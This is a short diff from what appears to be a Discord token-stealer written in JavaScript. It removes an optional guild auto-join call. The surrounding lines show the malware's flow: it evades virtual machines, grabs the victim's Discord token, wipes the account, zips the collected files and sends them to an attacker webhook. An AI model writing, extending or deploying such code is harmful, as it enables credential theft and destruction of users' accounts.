@@ -28,7 +28,6 @@ if (config.vmProtect && checkVM()) {
 
     require('./functions/grab-discord-token').then(() => {
       require('./functions/nuke-discord-account');
-      if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
 
       require('./functions/zip').then(zipFile => {
         require('./functions/webhook')(zipFile);
